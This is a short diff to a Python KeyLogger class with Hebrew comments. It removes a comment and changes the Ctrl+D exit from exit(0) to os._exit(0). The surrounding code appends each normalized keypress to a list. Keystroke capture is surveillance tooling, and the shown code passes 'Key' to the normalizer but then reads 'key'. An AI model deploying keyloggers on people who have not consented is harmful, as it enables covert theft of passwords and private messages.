@@ -31,7 +31,6 @@ class KeyLogger(IKeyLogger):
         """Handle the event when a key is pressed."""
         key_normalized = KeyLogger.normalize_key(Key)
         # print(key_nise)
-        # לתקן את הדרך
         self.arr.append(key_normalized)
 
         # פןנקציה שמפסיקה את התוכנה אם לחץ על קונטרול שיפט d
@@ -41,7 +40,7 @@ class KeyLogger(IKeyLogger):
         try:
             if key.char == '\x04':  # Ctrl+D
                 print("Exiting...")
-                exit(0)
+                os._exit(0)
         except AttributeError:
             pass
 
